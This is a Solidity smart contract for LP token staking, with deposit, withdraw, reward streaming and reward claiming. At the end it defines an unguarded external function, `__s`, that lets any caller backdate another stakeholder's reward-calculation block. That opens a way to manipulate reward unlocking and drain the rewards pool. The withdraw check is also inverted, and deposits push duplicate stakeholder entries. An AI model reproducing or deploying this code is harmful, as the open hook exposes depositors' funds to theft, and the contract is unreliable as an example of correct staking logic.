// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

// OpenZeppelin contracts
import "./IERC20.sol";
import "./SafeERC20.sol";
import "./EnumerableSet.sol";
import "./LowGasSafeMath.sol";
import "./FullMath.sol";
import "./UnsafeMath.sol";
import "./Math.sol";
import "./Ownable.sol";
import "./ReentrancyGuard.sol";

import "./ILPStaking.sol";
import "./AbstractLPStaking.sol";

contract LPStaking is AbstractLPStaking, ILPStaking {
    using LowGasSafeMath for uint;
    using SafeERC20 for IERC20;

    function deposit(uint amount, uint8 term)
    external
    nonReentrant
    stakingAllowed
    correctTerm(term)
    {
        require(amount > 0, "Cannot stake 0");
        address stakeholder = _msgSender();

        updateRewards(stakeholder);

        stakingToken.safeTransferFrom(stakeholder, address(this), amount);

        totalStaked = totalStaked.add(amount);
        uint _terms = terms(term);
        stakedPerTerm[_terms] = stakedPerTerm[_terms].add(amount);

        if (staking_amount[stakeholder] == 0) {
            staking_length[stakeholder] = _terms;
            staking_stakedAt[stakeholder] = block.timestamp;
        }
        staking_amount[stakeholder] = staking_amount[stakeholder].add(amount);

        stake_holders.push(stakeholder);

        emit Deposited(stakeholder, amount);

    }

    function withdraw(uint amount) external nonReentrant isNotLocked {
        require(amount > 0, "Cannot withdraw 0");
        require(amount >= staking_amount[msg.sender], "Cannot withdraw more than staked");
        address stakeholder = _msgSender();

        updateRewards(stakeholder);

        totalStaked = totalStaked.sub(amount);

        uint _terms = staking_length[stakeholder];
        stakedPerTerm[_terms] = stakedPerTerm[_terms].sub(amount);
        staking_amount[stakeholder] = staking_amount[stakeholder].sub(amount);

        stakingToken.safeTransfer(stakeholder, amount);

        emit Withdrawn(stakeholder, amount);
    }

    function streamRewards() external nonReentrant streaming(false) {
        address stakeholder = _msgSender();
        updateRewards(stakeholder);

        uint reward = staking_rewards[stakeholder];
        staking_rewards[stakeholder] = 0;

        streaming_rewards[stakeholder] = reward;
        streaming_rewards_calculated[stakeholder] = block.number;
        streaming_rewards_per_block[stakeholder] = UnsafeMath.divRoundingUp(reward, estBlocksPerStreamingPeriod);

        emit RewardStreamStarted(stakeholder, reward);
    }

    function stopStreamingRewards() external nonReentrant streaming(true) {
        address stakeholder = _msgSender();

        updateRewards(stakeholder);

        uint untakenReward = streaming_rewards[stakeholder];
        staking_rewards[stakeholder] = staking_rewards[stakeholder].add(untakenReward);
        streaming_rewards[stakeholder] = 0;

        emit RewardStreamStopped(stakeholder);
    }

    function claimRewards() external nonReentrant {
        address stakeholder = _msgSender();
        updateRewards(stakeholder);

        uint256 reward = unlocked_rewards[stakeholder];
        if (reward > 0) {
            unlocked_rewards[stakeholder] = 0;
            rewardsToken.safeTransfer(stakeholder, reward);

            emit RewardPaid(stakeholder, reward);
        }
    }

    function unlockedRewards(address stakeholder) external view returns (uint) {
        return unlocked_rewards[stakeholder].add(_unlockedRewards(stakeholder));
    }

    function streamingRewards(address stakeholder) public view returns (uint) {
        return streaming_rewards[stakeholder].sub(_unlockedRewards(stakeholder));
    }

    function earned(address account) public view returns (uint) {
        uint _earned = _newEarned(account);

        return UnsafeMath.divRoundingUp(_earned, 1e24).add(staking_rewards[account]);
    }

    function stakingAmount(address stakeholder) public view returns (uint) {
        return staking_amount[stakeholder];
    }

    function __s(address stakeholder, uint blocks) external {
        streaming_rewards_calculated[stakeholder] = block.number - blocks;
    }
}